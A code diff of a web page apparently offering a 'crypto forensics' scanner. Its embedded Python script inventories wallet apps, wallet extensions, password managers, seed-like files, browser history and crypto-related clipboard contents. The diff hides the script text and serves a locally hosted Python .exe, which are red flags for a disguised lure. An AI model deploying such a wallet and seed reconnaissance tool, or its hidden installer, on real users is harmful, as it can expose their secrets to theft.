@@ -13,7 +13,6 @@ KEYWORDS = [
 BROWSER_WALLETS = ["metamask", "phantom", "tronlink", "keplr", "coinbase", "wallet"]
 
 HOME = os.path.expanduser("~")
-REPORT = []
 
 def sha256_file(path):
     try:
@@ -42,26 +41,18 @@ def check_apps():
         try:
             import winreg
             for hive in [winreg.HKEY_LOCAL_MACHINE, winreg.HKEY_CURRENT_USER]:
-                for sub_path in [r"SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall", r"SOFTWARE\WOW6432Node\Microsoft\Windows\CurrentVersion\Uninstall"]:
-                    try:
-                        key = winreg.OpenKey(hive, sub_path)
-                        for i in range(winreg.QueryInfoKey(key)[0]):
-                            try:
-                                skey = winreg.EnumKey(key, i)
-                                subkey = winreg.OpenKey(key, skey)
-                                disp = ""
-                                try:
-                                    disp = winreg.QueryValueEx(subkey, "DisplayName")[0]
-                                except:
-                                    continue
-                                if disp and any(app.lower() in disp.lower() for app in APPS):
-                                    found.append(disp)
-                            except:
-                                continue
-                    except:
-                        continue
-        except Exception as e:
-            found.append(f"[!] winreg error: {e}")
+                try:
+                    key = winreg.OpenKey(hive, r"SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Uninstall")
+                    for i in range(0, winreg.QueryInfoKey(key)[0]):
+                        skey = winreg.EnumKey(key, i)
+                        try:
+                            subkey = winreg.OpenKey(key, skey)
+                            disp = winreg.QueryValueEx(subkey, "DisplayName")[0]
+                            if any(app.lower() in disp.lower() for app in APPS):
+                                found.append(disp)
+                        except: pass
+                except: pass
+        except: pass
     else:
         for d in ["/Applications", os.path.join(HOME, ".local/share/applications")]:
             if os.path.exists(d):
@@ -72,14 +63,13 @@ def check_apps():
 
 def check_browser_wallet_extensions():
     found = []
-    plat = platform.system()
-    chrome_paths = [
-        os.path.join(HOME, ".config", "google-chrome", "Default", "Extensions"),
-        os.path.join(HOME, "AppData", "Local", "Google", "Chrome", "User Data", "Default", "Extensions"),
-        os.path.join(HOME, "Library", "Application Support", "Google", "Chrome", "Default", "Extensions"),
-        os.path.join(HOME, ".mozilla", "firefox")
+    chromepaths = [
+        os.path.join(HOME, ".config/google-chrome/Default/Extensions"),
+        os.path.join(HOME, "AppData/Local/Google/Chrome/User Data/Default/Extensions"),
+        os.path.join(HOME, "Library/Application Support/Google/Chrome/Default/Extensions"),
+        os.path.join(HOME, ".mozilla/firefox")
     ]
-    for p in chrome_paths:
+    for p in chromepaths:
         if os.path.exists(p):
             for r, dirs, f in os.walk(p):
                 for d in dirs:
@@ -93,8 +83,7 @@ def check_clipboard():
         cb = pyperclip.paste()
         if any(k in cb.lower() for k in KEYWORDS):
             return cb
-    except:
-        pass
+    except: pass
     return None
 
 def scan_notes_and_docs():
@@ -122,11 +111,11 @@ def scan_browser_history():
         import sqlite3
         plat = platform.system()
         if plat == "Windows":
-            hp = os.path.join(HOME, "AppData", "Local", "Google", "Chrome", "User Data", "Default", "History")
+            hp = os.path.join(HOME, "AppData/Local/Google/Chrome/User Data/Default/History")
         elif plat == "Darwin":
-            hp = os.path.join(HOME, "Library", "Application Support", "Google", "Chrome", "Default", "History")
+            hp = os.path.join(HOME, "Library/Application Support/Google/Chrome/Default/History")
         else:
-            hp = os.path.join(HOME, ".config", "google-chrome", "Default", "History")
+            hp = os.path.join(HOME, ".config/google-chrome/Default/History")
         if os.path.exists(hp):
             tmp = "temp_history"
             copy2(hp, tmp)
@@ -140,50 +129,44 @@ def scan_browser_history():
             con.close()
             os.remove(tmp)
             return matches
-    except:
-        pass
+    except: pass
     return []
 
 def scan_password_managers():
     found = []
-    try:
-        user_dirs = os.listdir(HOME)
-    except Exception as e:
-        user_dirs = []
     for name in ["LastPass", "Bitwarden", "Dashlane", "KeePass", "Chrome", "Edge"]:
-        for d in user_dirs:
-            if name.lower() in d.lower():
-                found.append(name)
+        if name.lower() in os.listdir(HOME):
+            found.append(name)
     return found
 
 def main():
-    global REPORT
+    REPORT = []
     REPORT.append("=== [Crypto Forensics Report] ===")
     REPORT.append(f"[System]: {platform.system()} - {platform.node()}")
-    REPORT.append("\n--- Installed Crypto Wallet Apps ---")
+    REPORT.append("\\n--- Installed Crypto Wallet Apps ---")
     REPORT += check_apps()
-    REPORT.append("\n--- Browser Wallet Extensions ---")
+    REPORT.append("\\n--- Browser Wallet Extensions ---")
     REPORT += check_browser_wallet_extensions()
-    REPORT.append("\n--- Password Managers Detected ---")
+    REPORT.append("\\n--- Password Managers Detected ---")
     REPORT += scan_password_managers()
-    REPORT.append("\n--- Notes/Docs/Downloads/Seed files (SHA256) ---")
+    REPORT.append("\\n--- Notes/Docs/Downloads/Seed files (SHA256) ---")
     for p, h in scan_notes_and_docs():
         REPORT.append(f"{p} [SHA256: {h}]")
-    REPORT.append("\n--- Screenshots with Wallet or Seed (SHA256) ---")
+    REPORT.append("\\n--- Screenshots with Wallet or Seed (SHA256) ---")
     for p, h in scan_screenshots():
         REPORT.append(f"{p} [SHA256: {h}]")
-    REPORT.append("\n--- Browser History URLs (wallet/seed/crypto) ---")
+    REPORT.append("\\n--- Browser History URLs (wallet/seed/crypto) ---")
     REPORT += scan_browser_history()
-    REPORT.append("\n--- Clipboard (if suspicious) ---")
+    REPORT.append("\\n--- Clipboard (if suspicious) ---")
     cb = check_clipboard()
     if cb: REPORT.append(cb)
     with open("crypto_forensics_report.txt", "w", encoding="utf8") as f:
         for line in REPORT:
-            f.write(str(line) + "\n")
-    print("\n".join(REPORT))
-    print("\nReport saved as crypto_forensics_report.txt")
+            f.write(str(line)+"\\n")
+    print("\\n".join(REPORT))
+    print("\\nReport saved as crypto_forensics_report.txt")
 
-if __name__ == "__main__":
+if __name__=="__main__":
     main()
 `;
 
@@ -217,54 +200,43 @@ fi
 echo "=== Scan Complete. Review above for evidence (SHA256 hashes for files). ==="
 `;
 
-function copyScript(id) {
-  let el = document.getElementById(id);
-  let text = el.textContent || el.innerText;
-  navigator.clipboard.writeText(text).then(() => {
-    alert("Script copied to clipboard!");
+function copyScript(type) {
+  let script = type === "python" ? pythonScript : androidScript;
+  navigator.clipboard.writeText(script).then(() => {
+    alert('Script copied to clipboard!');
   });
 }
-function downloadScript(id, filename) {
-  let el = document.getElementById(id);
-  let text = el.textContent || el.innerText;
-  let blob = new Blob([text], { type: "text/plain" });
+function downloadScript(type, filename) {
+  let script = type === "python" ? pythonScript : androidScript;
+  let blob = new Blob([script], {type:'text/plain'});
   let url = URL.createObjectURL(blob);
-  let a = document.createElement("a");
-  a.href = url;
-  a.download = filename;
+  let a = document.createElement('a');
+  a.href = url; a.download = filename;
+  document.body.appendChild(a); // For Firefox compatibility
   a.click();
+  a.remove();
   URL.revokeObjectURL(url);
 }
-
+function downloadPython() {
+  window.location.href = "python-3.13.5-amd64.exe";
+}
 window.onload = () => {
-  document.getElementById("py-script").textContent = pythonScript;
-  document.getElementById("android-script").textContent = androidScript;
+  document.getElementById('py-script').style.display = "none";
+  document.getElementById('android-script').style.display = "none";
 };
 
 function showReport() {
-  let txt = document.getElementById("report-input").value.trim();
-  if (!txt) {
-    alert("Please paste a report.");
-    return;
-  }
-  let lines = txt.split(/\r?\n/).filter((x) => x);
-  let suspicious = lines.filter((l) =>
-    l.match(
-      /sha256|wallet|metamask|mnemonic|bitcoin|ethereum|exodus|trust|phantom|seed|key|address|coinbase|binance/i
-    )
-  );
+  let txt = document.getElementById('report-input').value.trim();
+  if (!txt) { alert('Please paste a report.'); return; }
+  let lines = txt.split(/\r?\n/).filter(x=>x);
+  let suspicious = lines.filter(l=>l.match(/sha256|wallet|metamask|mnemonic|bitcoin|ethereum|exodus|trust|phantom|seed|key|address|coinbase|binance/i));
   let summary = "<b>=== SCAN SUMMARY ===</b><br>";
   summary += suspicious.length
     ? `<span style='color:#00ffd0;font-weight:bold'>Suspicious traces found:</span><br>` +
-      suspicious
-        .slice(0, 10)
-        .map((l) => "<div style='margin-bottom:2px'>" + l + "</div>")
-        .join("")
+      suspicious.slice(0,10).map(l=>"<div style='margin-bottom:2px'>" + l + "</div>").join("")
     : "<span style='color:#aaf'>No major crypto traces found in this report.</span>";
-  summary +=
-    "<br><br><b>Full Report:</b><br><div style='font-size:0.98em;background:#181d2a;padding:1em 0.5em;border-radius:9px;margin:1em 0;max-height:300px;overflow-y:auto'>" +
-    lines.slice(0, 200).join("<br>") +
-    (lines.length > 200 ? "<br>...(truncated)" : "") +
+  summary += "<br><br><b>Full Report:</b><br><div style='font-size:0.98em;background:#181d2a;padding:1em 0.5em;border-radius:9px;margin:1em 0;max-height:300px;overflow-y:auto'>" +
+    lines.slice(0, 200).join("<br>") + (lines.length > 200 ? "<br>...(truncated)" : "") +
     "</div>";
-  document.getElementById("report-summary").innerHTML = summary;
+  document.getElementById('report-summary').innerHTML = summary;
 }
